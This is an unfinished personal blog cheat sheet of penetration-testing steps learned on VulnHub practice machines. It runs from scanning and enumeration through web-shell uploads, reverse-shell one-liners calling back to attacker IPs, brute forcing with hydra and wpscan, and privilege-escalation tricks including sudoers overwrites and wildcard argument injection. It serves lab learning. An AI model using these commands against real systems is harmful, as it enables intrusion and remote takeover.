---
layout: post
title: "Learning from VulnHub"
date: 2014-11-03 16:40:21 +0000
comments: true
categories: 
---
This post (Work in Progress) mark downs the learning gathered by doing the vulnerable machines provided by the VulnHub. Once you download the virtual machine from the website and run it in VMware or Virtual Box, below steps could be followed to find the vulnerabilties.
<!-- more -->
<ol>
{% comment %} 
First Point Starts
{% endcomment %}
<li><strong>Finding the IP address</strong>:

<ul>
<li><strong>Netdiscover</strong>:  an active/passive arp reconnaissance tool
{% codeblock %}
netdiscover [options] 
-i interface : The network interface to sniff and inject packets.
-r range     : Scan a given range instead of auto scan.

Example: netdiscover -i eth0/wlan0/vboxnet0/vmnet1 -r 192.168.1.0/24
{% endcodeblock %}
{% codeblock Interface name for Virtualization Software%}
Virtualbox   : vboxnet
Vmware       : vmnet
{% endcodeblock %}
</li>

<li><strong>Nmap</strong>: Network exploration tool and security / port scanner
{% codeblock %}
nmap [Scan Type] [Options] {target specification}
-sP/-sn Ping Scan - disable port scan 
Example: nmap -sP/-sn 192.168.1.0/24
{% endcodeblock %}
</li>
</ul>
</li>
{% comment %} 
First Point Ends
{% endcomment %}
{% comment %} 
Second Point Starts
{% endcomment %}

<li><strong>Port Scanning the system</strong>:
<br>
Port scanning provides a large amount of information on open services and possible exploits that target these services.
Two options
<ul>
<li><strong>Unicornscan</strong>:  port scanner that utilizes it’s own userland TCP/IP stack, which allows it to run a asynchronous scans. Faster than nmap and can scan 65,535 ports in a relatively shorter time frame.
{% codeblock %}
unicornscan [options] X.X.X.X/YY:S-E
-i, --interface      : interface name, like eth0 or fxp1, not normally required
-m, --mode           : scan mode, tcp (syn) scan is default, U for udp T for tcp `sf' for tcp connect scan and A for arp
	               for -mT you can also specify tcp flags following the T like -mTsFpU for example that would send tcp syn packets with (NO Syn|FIN|NO Push|URG)

Address ranges are cidr like 1.2.3.4/8 for all of 1.?.?.?, if you omit the cidr mask then /32 is implied.
Port ranges are like 1-4096 with 53 only scanning one port, a for all 65k and p for 1-1024

example: unicornscan 192.168.1.5:1-4000 gateway:a would scan port 1 - 4000 for 192.168.1.5 and all 65K ports for gateway.
{% endcodeblock %}
</li>

<li><strong>Nmap</strong>: Network exploration tool and security / port scanner
{% codeblock %}
nmap [Scan Type] [Options] {target specification}
HOST DISCOVERY:
-sL: List Scan - simply list targets to scan
-sn: Ping Scan - disable port scan
-Pn: Treat all hosts as online -- skip host discovery

SCAN TECHNIQUES:
-sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
-sU: UDP Scan
-sN/sF/sX: TCP Null, FIN, and Xmas scans

PORT SPECIFICATION:
-p <port ranges>: Only scan specified ports
Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9

SERVICE/VERSION DETECTION:
-sV: Probe open ports to determine service/version info

OUTPUT:
-oN/-oX/-oS/-oG <file>: Output scan in normal, XML, s|<rIpt kIddi3, and Grepable format, respectively, to the given filename.
-oA <basename>: Output in the three major formats at once
-v: Increase verbosity level (use -vv or more for greater effect)

MISC:
-6: Enable IPv6 scanning
-A: Enable OS detection, version detection, script scanning, and tracerout
{% endcodeblock %}
</li>


As unicornscan is so fast, it makes sense to use it for scanning large networks or a large number of ports. The idea is to use unicornscan to scan all ports, and make a list of those ports that are open and pass them to nmap for service detection. <a href="https://twitter.com/superkojiman">superkojiman</a> has written a script for this available at <a href="https://github.com/superkojiman/onetwopunch">GitHub</a>.

<li>When portscanning a host, you will be presented with a list of open ports. In many cases, the port number tells you what application is running. Port 25 is  usually  SMTP,  port  80  mostly HTTP.   However, this is not always the case, and especially when dealing with proprietary protocols running on non-standard ports you will not be able to determine what application is running.

By using <strong>amap</strong>, we can identify if any SSL server is running on port 3445 or some oracle listener on port 23. Also, it will actually do an SSL connect if you want and then try to identify the SSL-enabled protocol! One of the VM in vulnhub was running http and https on the same port.
```
amap -A 192.168.1.2 12380
amap v5.4 (www.thc.org/thc-amap) started at 2016-08-10 05:48:09 - APPLICATION MAPPING mode

Protocol on 192.168.1.2:12380/tcp matches http
Protocol on 192.168.1.2:12380/tcp matches http-apache-2
Protocol on 192.168.1.2:12380/tcp matches ntp
Protocol on 192.168.1.2:12380/tcp matches ssl

Unidentified ports: none.

amap v5.4 finished at 2016-08-10 05:48:16
```</li>
</ul>
</li>

<br>
{% comment %} 
Second Point Ends
{% endcomment %}
<li><strong>Listen to the interface</strong>: We should always listen to the local interface on which the VM is hosted such as vboxnet0 or vmnet using wireshark or tcpdump. Many VMs send data randomly, for example, In one of the VM, it does the arp scan and sends a SYN packet on the port 4444, if something is listening on that port, it send the data.
```
18:02:04.096292 IP 192.168.56.101.36327 > 192.168.56.1.4444: Flags [S], seq 861815232, win 16384, options [mss 1460,nop,nop,sackOK,nop,wscale 3,nop,nop,TS val 4127458640 ecr 0], length 0
18:02:04.096330 IP 192.168.56.1.4444 > 192.168.56.101.36327: Flags [R.], seq 0, ack 861815233, win 0, length 0
18:02:04.098567 ARP, Request who-has 192.168.56.2 tell 192.168.56.101, length 28
18:02:04.098584 ARP, Request who-has 192.168.56.2 tell 192.168.56.101, length 28
18:02:04.100756 ARP, Request who-has 192.168.56.3 tell 192.168.56.101, length 28
18:02:04.100773 ARP, Request who-has 192.168.56.3 tell 192.168.56.101, length 28
```
On listening on the port 4444, we recieve a base64 encoded string
```
nc -lvp 4444
listening on [any] 4444 ...
192.168.56.101: inverse host lookup failed: Unknown host
connect to [192.168.56.1] from (UNKNOWN) [192.168.56.101] 39519
...V2VsY29tZSENCg0KWW91IGZpbmQgeW91cnNlbGYgc3RhcmluZyB0b3dhcmRzIHRoZSBob3Jpem9uLCB3aXRoIG5vdGhpbmcgYnV0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxhbmQgb2Ygbm90aGluZ25lc3MuDQoNClR1cm5pbmcgdG8geW91ciBub3J0aCB5b3Ugbm90aWNlIGEgc21hbGwgZmxpY2tlciBvZiBsaWdodCBpbiB0aGUgZGlzdGFuY2UuDQpZb3Ugd2FsayBub3J0aCB0b3dhcmRzIHRoZSBmbGlja2VyIG9mIGxpZ2h0LCBvbmx5IHRvIGJlIHN0b3BwZWQgYnkgc29tZSB0eXBlIG9mIGludmlzaWJsZSBiYXJyaWVyLiAgDQoNClRoZSBhaXIgYXJvdW5kIHlvdSBiZWdpbnMgdG8gZ2V0IHRoaWNrZXIsIGFuZCB5b3VyIGhlYXJ0IGJlZ2lucyB0byBiZWF0IGFnYWluc3QgeW91ciBjaGVzdC4gDQpZb3UgdHVybiB0byB5b3VyIGxlZnQuLiB0aGVuIHRvIHlvdXIgcmlnaHQhICBZb3UgYXJlIHRyYXBwZWQhDQoNCllvdSBmdW1ibGUgdGhyb3VnaCB5b3VyIHBvY2tldHMuLiBub3RoaW5nISAgDQpZb3UgbG9vayBkb3duIGFuZCBzZWUgeW91IGFyZSBzdGFuZGluZyBpbiBzYW5kLiAgDQpEcm9wcGluZyB0byB5b3VyIGtuZWVzIHlvdSBiZWdpbiB0byBkaWcgZnJhbnRpY2FsbHkuDQoNCkFzIHlvdSBkaWcgeW91IG5vdGljZSB0aGUgYmFycmllciBleHRlbmRzIHVuZGVyZ3JvdW5kISAgDQpGcmFudGljYWxseSB5b3Uga2VlcCBkaWdnaW5nIGFuZCBkaWdnaW5nIHVudGlsIHlvdXIgbmFpbHMgc3VkZGVubHkgY2F0Y2ggb24gYW4gb2JqZWN0Lg0KDQpZb3UgZGlnIGZ1cnRoZXIgYW5kIGRpc2NvdmVyIGEgc21hbGwgd29vZGVuIGJveC4gIA0KZmxhZzF7ZTYwNzhiOWIxYWFjOTE1ZDExYjlmZDU5NzkxMDMwYmZ9IGlzIGVuZ3JhdmVkIG9uIHRoZSBsaWQuDQoNCllvdSBvcGVuIHRoZSBib3gsIGFuZCBmaW5kIGEgcGFyY2htZW50IHdpdGggdGhlIGZvbGxvd2luZyB3cml0dGVuIG9uIGl0LiAiQ2hhbnQgdGhlIHN0cmluZyBvZiBmbGFnMSAtIHU2NjYi...
```
</li>

<li><strong>From Nothing to a Unprivileged Shell</strong>: 
<br>
At this point, you would have an idea about the different services and service version running on the system.
{% comment %} 
New Order List Start
{% endcomment %}
<ol>
<li><strong>searchsploit</strong>: Exploit Database Archive Search.
<br>
First, we need to check if the operating system is using any services which are vulnerable or the exploit is already available in the internet.
For example, A vulnerable service webmin is present in one of the VM which can be exploited to extract information from the system.
{% codeblock %}
root@kali:~# nmap -sV -A 172.16.73.128
**********Trimmed**************
10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
| ndmp-version: 
|_  ERROR: Failed to get host information from server
**********Trimmed**************
{% endcodeblock %}
If we search for webmin in searchsploit, we will find different exploits available for it and we just have to use the correct one based on the utility and the version matching.
{% codeblock %}
root@kali:~# searchsploit webmin
**********Trimmed**************
 Description                                                                            Path
----------------------------------------------------------------------------------------------------------------
Webmin < 1.290 / Usermin < 1.220 Arbitrary File Disclosure Exploit                   | /multiple/remote/1997.php
Webmin < 1.290 / Usermin < 1.220 Arbitrary File Disclosure Exploit (perl)            | /multiple/remote/2017.pl
Webmin 1.x HTML Email Command Execution Vulnerability                                | /cgi/webapps/24574.txt
**********Trimmed**************
{% endcodeblock %}
**Insert searchsploit -xml options **
</li>

<li><strong>Webserver Opportunities</strong>?:
If a webserver is running on the machine, we can start with running 
<ul>whatweb to find what server is running. Further, we can execute nikto, w3af to find any vulnerabilities. dirb to find any hidden directories.
<li>
<strong>PUT Method</strong>: Sometimes, it is also a good option to check for the various OPTIONS available on the website such as GET, PUT, DELETE etc.

Curl command can be used to check the options available:
```
curl -X OPTIONS -v http://192.168.126.129/test/
*   Trying 192.168.126.129...
* Connected to 192.168.126.129 (192.168.126.129) port 80 (#0)
> OPTIONS /test/ HTTP/1.1
> Host: 192.168.126.129
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< DAV: 1,2
< MS-Author-Via: DAV
< Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
< Allow: OPTIONS, GET, HEAD, POST
< Content-Length: 0
< Date: Fri, 29 Apr 2016 09:41:19 GMT
< Server: lighttpd/1.4.28
< 
* Connection #0 to host 192.168.126.129 left intact
```
The put method allows you to upload a file. Eventually, you can upload a php file which can work as a shell. There are multiple methods to upload the file as mentioned in <a href="http://www.smeegesec.com/2014/10/detecting-and-exploiting-http-put-method.html">Detecting and exploiting the HTTP Put Method</a>.

The few are
<ul>
<li>
Nmap:
```
nmap -p 80 --script http-put --script-args http-put.url='/uploads/rootme.php',http-put.file='/tmp/rootme.php'
```
</li>
<li>
curl:
```
curl --upload-file test.txt -v --url http://192.168.126.129/test/test.txt
```
or
```
curl -X PUT -d '<?php system($_GET["cmd"]);' http://192.168.56.103/test/cmd.php
```
</li>
</ul>
</li>

<li>Wordpress: When running wpscan, also make sure you run \-\-enumerate u for enumerating usernames. By default wpscan doesn't run it.
Also, scan for plugins
```
wpsscan
--url       | -u <target url>       The WordPress URL/domain to scan.
--force     | -f                    Forces WPScan to not check if the remote site is running WordPress.
--enumerate | -e [option(s)]        Enumeration.
  option :
    u        usernames from id 1 to 10
    u[10-20] usernames from id 10 to 20 (you must write [] chars)
    p        plugins
    vp       only vulnerable plugins
    ap       all plugins (can take a long time)
    tt       timthumbs
    t        themes
    vt       only vulnerable themes
    at       all themes (can take a long time)
  Multiple values are allowed : "-e tt,p" will enumerate timthumbs and plugins
  If no option is supplied, the default is "vt,tt,u,vp"
```
Wordpress configuration is stored in wp-config.php. If you are able to download it, you might get username and password to database.

We can also use wordpress to bruteforce password for a username
```
wpscan --url http://192.168.1.2 --wordlist /home/bitvijays/Documents/Walkthru/Mr_Robot_1/test.txt --username elliot
```</li>
</ul>
<ul>
<li>Names? Possible Usernames? Possible Passwords?:
<br>
Sometimes, on visiting the webpage of the webserver (If Vulnerable machine is running any http/https webserver), you would found possible names of the employees working in the company. Now, it is common practise to have username based on your first/last name. It can be based on different combinations such as firstname.lastname or first letter of first name + lastname etc. <a href="https://twitter.com/superkojiman">superkojiman</a> has written a python script named "namemash.py" available at <a href="https://gist.githubusercontent.com/superkojiman/11076951/raw/namemash.py">here</a> which could be used to create possible usernames.
However, we still have a large amount of usernames to bruteforce with passwords. Further, if the vulnerable machine is running a SMTP mail server, we can verify if the particular username exists or not and modify namemash.py to generate usernames for that pattern.
<ol>
<li>Using metasploit smtp_enum module:
<br>
Once msfconsole is running, use auxiliary/scanner/smtp/smtp_enum, enter the RHOSTS (target address) and USER FILE containing the list of probable user accounts.
</li>
<li>Using VRFY command:</li>
<li>Using RCPT TO command:</li>
</ol>

</li>
<li>FTP Opportunities:
<br>
If ftp anonymous login is provided or you have login details, you can download the contents by wget, (For anonymous login user password are not required)
{% codeblock %}
wget -rq ftp://IP 
--ftp-user=username
--ftp-password=password
{% endcodeblock %}
</li>

</ul>
</li>
<li><strong>Remote Code Execution</strong>:
<ul>
<li><strong>MYSQL</strong>: If we have MYSQL Shell, we can use mysql outfile function to upload a shell.
```
echo -n "<?php phpinfo(); ?>" | xxd -ps
3c3f70687020706870696e666f28293b203f3e
```
```
select 0x3c3f70687020706870696e666f28293b203f3e into outfile "/var/www/html/blogblog/wp-content/uploads/phpinfo.php"
```</li>
<li>
<strong>Reverse Shells</strong>: Mostly taken from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">PentestMonkey Reverse shell cheat sheet</a> and <a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">Reverse Shell Cheat sheet from HighOn.Coffee</a> 

<ul>
<li>PHP:
We can create a new file say ( shell.php ) on the server containing
```
<?php system($\_GET["cmd"]); ?>
```
or
```
<?php echo shell_exec($\_GET["cmd"]); ?>
```
which can be accessed by
```
http://IP/shell.php?cmd=id
```
or we can create a php meterpreter shell, run a exploit handler on msf, upload the payload on the server and wait for the connection.
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f raw -o /tmp/payload.php
```
Weely also generates a webshell
```
weevely generate password /tmp/payload.php
```
which can be called by
```
weevely http://192.168.1.2/location_of_payload password
```
However, it wasn't as useful as php meterpreter or reverse shell.

PHP Trick:
This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6
```
; php -r '$sock=fsockopen("192.168.56.101",1337);exec("/bin/sh -i <&3 >&3 2>&3");'
```
The above can be connected by listening at port 1337 by using nc
</li>
<li>
Ruby:
```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
</li>
<li>
Perl:
```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
</li>
<li>
Python:
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
</li>
<li>
Java:
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
</li>
<li>
JSP:
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.129 LPORT=4444 -f war > runme.war
```
</li>
<li>
XTerm:
One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.
```
xterm -display 10.0.0.1:1
```
To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):
```
Xnest :1
```
You’ll need to authorise the target to connect to you (command also run on your host):
```
xhost +targetip
```
</li>
</ul>
</li>
</ul>
<li><strong>Spawning a TTY Shell</strong>:  <a href="http://netsec.ws/?p=337">Spawning a TTY Shell</a> and  <a href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">Post-Exploitation Without A TTY</a> has provided multiple ways to get a tty shell
```
python -c 'import pty; pty.spawn("/bin/sh")'
```
or 
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
```
python -c 'import os; os.system("/bin/bash")'
```
```
/bin/sh -i
```
```
perl \-e 'exec "/bin/sh";'
```
```
perl: exec "/bin/sh";
```
```
ruby: exec "/bin/sh"
```
```
lua: os.execute('/bin/sh')
```
(From within IRB)
```
exec "/bin/sh"
```
(From within vi)
```
:!bash
```
(From within vi)
```
:set shell=/bin/bash:shell
```
(From within nmap)
```
!sh
```
Using “Expect” To Get A TTY
```
$ cat sh.exp
#!/usr/bin/expect
# Spawn a shell, then allow the user to interact with it.
# The new shell will have a good enough TTY to run tools like ssh, su and login
spawn sh
interact
``` </li>


<li>Brute forcing:
hydra:
```
-l LOGIN              or -L FILE login with LOGIN name, or load several logins from FILE
-p PASS               or -P FILE try password PASS, or load several passwords from FILE
-U        service module usage details
-e nsr additional checks, "n" for null password, "s" try login as pass, "r" try the reverse login as pass


```
hydra http-post-form:
```
hydra -U http-post-form

Help for module http-post-form:
============================================================================
Module http-post-form requires the page and the parameters for the web form.

By default this module is configured to follow a maximum of 5 redirections in
a row. It always gathers a new cookie from the same URL without variables
The parameters take three ":" separated values, plus optional values.
(Note: if you need a colon in the option string as value, escape it with "\:", but do not escape a "\" with "\\".)

Syntax:   <url>:<form parameters>:<condition string>[:<optional>[:<optional>]
First is the page on the server to GET or POST to (URL).
Second is the POST/GET variables (taken from either the browser, proxy, etc.
 with usernames and passwords being replaced in the "^USER^" and "^PASS^"
 placeholders (FORM PARAMETERS)
Third is the string that it checks for an *invalid* login (by default)
 Invalid condition login check can be preceded by "F=", successful condition
 login check must be preceded by "S=".
 This is where most people get it wrong. You have to check the webapp what a
 failed string looks like and put it in this parameter!
The following parameters are optional:
 C=/page/uri     to define a different page to gather initial cookies from
 (h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request
                 ^USER^ and ^PASS^ can also be put into these headers!
                 Note: 'h' will add the user-defined header at the end
                 regardless it's already being sent by Hydra or not.
                 'H' will replace the value of that header if it exists, by the
                 one supplied by the user, or add the header at the end
Note that if you are going to put colons (:) in your headers you should escape them with a backslash (\).
 All colons that are not option separators should be escaped (see the examples above and below).
 You can specify a header without escaping the colons, but that way you will not be able to put colons
 in the header value itself, as they will be interpreted by hydra as option separators.

Examples:
 "/login.php:user=^USER^&pass=^PASS^:incorrect"
 "/login.php:user=^USER^&pass=^PASS^&colon=colon\:escape:S=authlog=.*success"
 "/login.php:user=^USER^&pass=^PASS^&mid=123:authlog=.*failed"
 "/:user=^USER&pass=^PASS^:failed:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^"
 "/exchweb/bin/auth/owaauth.dll:destination=http%3A%2F%2F<target>%2Fexchange&flags=0&username=<domain>%5C^USER^&password=^PASS^&SubmitCreds=x&trusted=0:reason=:C=/exchweb"
```
</ul>
</li>
</ol>


<li><strong>Unprivileged shell to privileged shell:</strong>
<ol>
<li>Check cron.d and see if any script is executed as root at any time and is world writeable. If so, you can use to setuid a binary with /bin/bash and use it to get root.

Suid.c
```
int main(void) {
setgid(0); setuid(0);
execl(“/bin/sh”,”sh”,0); }
```
</li>

<li>
<strong>SUDO -l Permissions</strong>
<ul>
<li>
<strong>nmap suid</strong> shell:
```
nmap \-\-script <(echo 'require "os".execute "/bin/sh"')
```
or
```
nmap --interactive
```
</li>
<li>
If <strong>tee is suid</strong>: tee is used to read input and then write it to output and files. That means we can use tee to read our own commands and add them to any_script.sh, which can then be run as root by a user.
If some script is run as root, you may also run. For example, let's say tidy.sh is executed as root on the server, we can write the below code in temp.sh
```
temp.sh
echo “milton ALL=(ALL) ALL” > /etc/sudoers” 

or 

chmod +w /etc/sudoers to add write properties to sudoers file to do the above
```
and then
```
cat temp.sh | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh
```
which will add contents of temp.sh to tidyup.sh.
</li>
<li><strong>tcpdump</strong>:
The “-z postrotate-command” option (introduced in tcpdump version 4.0.0).

Create a temp.sh ( which contains the commands to executed as root )
```
id
/bin/nc 192.168.110.1 4444 -e /bin/bash
```
Execute the command 
```
sudo tcpdump -i eth0 -w /dev/null -W 1 -G 1 -z ./temp.sh -Z root
```
where
```
       -C file_size
              Before  writing a raw packet to a savefile, check whether the file is currently larger than file_size and, if so, close the current savefile and open a new one.  Savefiles after the first savefile will have
              the name specified with the -w flag, with a number after it, starting at 1 and continuing upward.  The units of file_size are millions of bytes (1,000,000 bytes, not 1,048,576 bytes).

       -W     Used  in conjunction with the -C option, this will limit the number of files created to the specified number, and begin overwriting files from the beginning, thus creating a 'rotating' buffer.  In addition,
              it will name the files with enough leading 0s to support the maximum number of files, allowing them to sort correctly.

              Used in conjunction with the -G option, this will limit the number of rotated dump files that get created, exiting with status 0 when reaching the limit. If used with -C as well, the behavior will result in
              cyclical files per timeslice.

       -z postrotate-command
              Used in conjunction with the -C or -G options, this will make tcpdump run " postrotate-command file " where file is the savefile being closed after each rotation. For example, specifying -z gzip or -z bzip2
              will compress each savefile using gzip or bzip2.

              Note that tcpdump will run the command in parallel to the capture, using the lowest priority so that this doesn't disturb the capture process.

              And in case you would like to use a command that itself takes flags or different arguments, you can always write a shell script that will take the savefile name as the only argument, make the flags &  argu‐
              ments arrangements and execute the command that you want.

       -Z user
       --relinquish-privileges=user
              If tcpdump is running as root, after opening the capture device or input savefile, but before opening any savefiles for output, change the user ID to user and the group ID to the primary group of user.

              This behavior can also be enabled by default at compile time.
```
</li>

More can be learn here https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/
</li>
</ul>
</li>
<li><strong>Unix Wildcards</strong>: 
<ul>
The below text is directly from the <a href="https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt">DefenseCode_Unix_WildCards_Gone_Wild</a>
<li><strong>Chown file reference trick</strong> (file owner hijacking)

First really interesting target I've stumbled across is 'chown'. Let's say that we have some publicly writeable directory with bunch of PHP files in there, and root user wants to change owner of all PHP files to 'nobody'. Pay attention to the file owners in the following files list.
```
[root@defensecode public]# ls -al
total 52
drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
drwx------. 22 user user 4096 Oct 28 17:34 ..
-rw-rw-r--.  1 user user   66 Oct 28 17:36 admin.php
-rw-rw-r--.  1 user user   34 Oct 28 17:35 ado.php
-rw-rw-r--.  1 user user   80 Oct 28 17:44 config.php
-rw-rw-r--.  1 user user  187 Oct 28 17:44 db.php
-rw-rw-r--.  1 user user  201 Oct 28 17:35 download.php
-rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
-rw-rw-r--.  1 user user   43 Oct 28 17:35 file1.php
-rw-rw-r--.  1 user user   56 Oct 28 17:47 footer.php
-rw-rw-r--.  1 user user  357 Oct 28 17:36 global.php
-rw-rw-r--.  1 user user  225 Oct 28 17:35 header.php
-rw-rw-r--.  1 user user  117 Oct 28 17:35 inc.php
-rw-rw-r--.  1 user user  111 Oct 28 17:38 index.php
-rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php
-rw-rw----.  1 user user   66 Oct 28 17:35 password.inc.php
-rw-rw-r--.  1 user user   94 Oct 28 17:35 script.php
```
Files in this public directory are mostly owned by the user named 'user', and root user will now change that to 'nobody'.
```
[root@defensecode public]# chown -R nobody:nobody *.php
```
Let's see who owns files now...
```
[root@defensecode public]# ls -al
total 52
drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
drwx------. 22 user user 4096 Oct 28 17:34 ..
-rw-rw-r--.  1 leon leon   66 Oct 28 17:36 admin.php
-rw-rw-r--.  1 leon leon   34 Oct 28 17:35 ado.php
-rw-rw-r--.  1 leon leon   80 Oct 28 17:44 config.php
-rw-rw-r--.  1 leon leon  187 Oct 28 17:44 db.php
-rw-rw-r--.  1 leon leon  201 Oct 28 17:35 download.php
-rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
-rw-rw-r--.  1 leon leon   43 Oct 28 17:35 file1.php
-rw-rw-r--.  1 leon leon   56 Oct 28 17:47 footer.php
-rw-rw-r--.  1 leon leon  357 Oct 28 17:36 global.php
-rw-rw-r--.  1 leon leon  225 Oct 28 17:35 header.php
-rw-rw-r--.  1 leon leon  117 Oct 28 17:35 inc.php
-rw-rw-r--.  1 leon leon  111 Oct 28 17:38 index.php
-rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php
-rw-rw----.  1 leon leon   66 Oct 28 17:35 password.inc.php
-rw-rw-r--.  1 leon leon   94 Oct 28 17:35 script.php
```
Something is not right... What happened? Somebody got drunk here. Superuser tried to change files owner to the user:group 'nobody', but somehow, all files are owned by the user 'leon' now.

If we take closer look, this directory previously contained just the following two files created and owned by the user 'leon'.
```
-rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
-rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php
```
Thing is that wildcard character used in 'chown' command line took arbitrary '--reference=.drf.php' file and passed it to the chown command at the command line as an option.

Let's check chown manual page (man chown):
```
   --reference=RFILE
          use RFILE's owner and group rather than specifying OWNER:GROUP values
```
So in this case, '--reference' option to 'chown' will override 'nobody:nobody' specified as the root, and new owner of files in this directory will be exactly same as the owner of '.drf.php', which is in this case user 'leon'. Just for the record, '.drf' is short for Dummy Reference File. :)

To conclude, reference option can be abused to change ownership of files to some arbitrary user. If we set some other file as argument to the --reference option, file that's owned by some other user, not 'leon', in that case he would become owner of all files in this directory. With this simple chown parameter pollution, we can trick root into changing ownership 
of files to arbitrary users, and practically "hijack" files that are of interest to us.

Even more, if user 'leon' previously created a symbolic link in that directory that points to let's say /etc/shadow, ownership of /etc/shadow would also be changed to the user 'leon'.
</li>
<li><strong>Chmod file reference trick</strong>

Another interesting attack vector similar to previously described 'chown' attack is 'chmod'. Chmod also has --reference option that can be abused to specify arbitrary permissions on files selected with asterisk wildcard. 
Chmod manual page (man chmod):
```
       --reference=RFILE
              use RFILE's mode instead of MODE values
```
Example is presented below.
```
[root@defensecode public]# ls -al
total 68
drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .
drwx------. 24 user user  4096 Oct 28 18:32 ..
-rw-rw-r--.  1 user user 20480 Oct 28 19:13 admin.php
-rw-rw-r--.  1 user user    34 Oct 28 17:47 ado.php
-rw-rw-r--.  1 user user   187 Oct 28 17:44 db.php
-rw-rw-r--.  1 user user   201 Oct 28 17:43 download.php
-rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php
-rw-rw-r--.  1 user user    43 Oct 28 17:35 file1.php
-rw-rw-r--.  1 user user    56 Oct 28 17:47 footer.php
-rw-rw-r--.  1 user user   357 Oct 28 17:36 global.php
-rw-rw-r--.  1 user user   225 Oct 28 17:37 header.php
-rw-rw-r--.  1 user user   117 Oct 28 17:36 inc.php
-rw-rw-r--.  1 user user   111 Oct 28 17:38 index.php
-rw-r--r--.  1 leon leon     0 Oct 29 00:41 --reference=.drf.php
-rw-rw-r--.  1 user user    94 Oct 28 17:38 script.php
```
Superuser will now try to set mode 000 on all files.
```
[root@defensecode public]# chmod 000 *
```
Let's check permissions on files...
```
[root@defensecode public]# ls -al
total 68
drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .
drwx------. 24 user user  4096 Oct 28 18:32 ..
-rwxrwxrwx.  1 user user 20480 Oct 28 19:13 admin.php
-rwxrwxrwx.  1 user user    34 Oct 28 17:47 ado.php
-rwxrwxrwx.  1 user user   187 Oct 28 17:44 db.php
-rwxrwxrwx.  1 user user   201 Oct 28 17:43 download.php
-rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php
-rwxrwxrwx.  1 user user    43 Oct 28 17:35 file1.php
-rwxrwxrwx.  1 user user    56 Oct 28 17:47 footer.php
-rwxrwxrwx.  1 user user   357 Oct 28 17:36 global.php
-rwxrwxrwx.  1 user user   225 Oct 28 17:37 header.php
-rwxrwxrwx.  1 user user   117 Oct 28 17:36 inc.php
-rwxrwxrwx.  1 user user   111 Oct 28 17:38 index.php
-rw-r--r--.  1 leon leon     0 Oct 29 00:41 --reference=.drf.php
-rwxrwxrwx.  1 user user    94 Oct 28 17:38 script.php
```
What happened? Instead of 000, all files are now set to mode 777 because of the '--reference' option supplied through file name.. Once again, file .drf.php owned by user 'leon' with mode 777 was used as reference file and since --reference option is supplied, all files will be set to mode 777. Beside just --reference option, attacker can also create another file with 
'-R' filename, to change file permissions on files in all subdirectories recursively. </li>

<li><strong>Tar arbitrary command execution</strong> 

Previous example is nice example of file ownership hijacking. Now, let's go to even more interesting stuff like arbitrary command execution. Tar is very common unix program 
for creating and extracting archives. 
Common usage for lets say creating archives is:
```
[root@defensecode public]# tar cvvf archive.tar *
```
So, what's the problem with 'tar'? Thing is that tar has many options, and among them, there some pretty interesting options from arbitrary parameter injection point of view.
```
Let's check tar manual page (man tar):

      --checkpoint[=NUMBER]
              display progress messages every NUMBERth record (default 10)

       --checkpoint-action=ACTION
              execute ACTION on each checkpoint
```
There is '--checkpoint-action' option, that will specify program which will be executed when checkpoint is reached. Basically, that allows us arbitrary command execution.

Check the following directory:
```
[root@defensecode public]# ls -al
